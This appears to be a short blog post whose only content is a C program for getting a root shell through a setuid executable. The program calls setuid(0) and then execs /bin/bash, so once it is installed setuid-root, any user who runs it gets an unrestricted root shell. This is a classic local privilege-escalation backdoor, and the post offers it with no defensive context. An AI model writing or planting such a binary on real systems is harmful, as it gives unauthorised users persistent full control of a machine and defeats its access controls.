---
layout: post
title: "get root shell with setuid executable"
description: ""
category: 
tags: []
---




<pre><code>#include &lt;unistd.h&gt;

int main() {
  const char *b = "/bin/bash";
  setuid(0);
  execl(b, b, 0);
}
</code></pre>

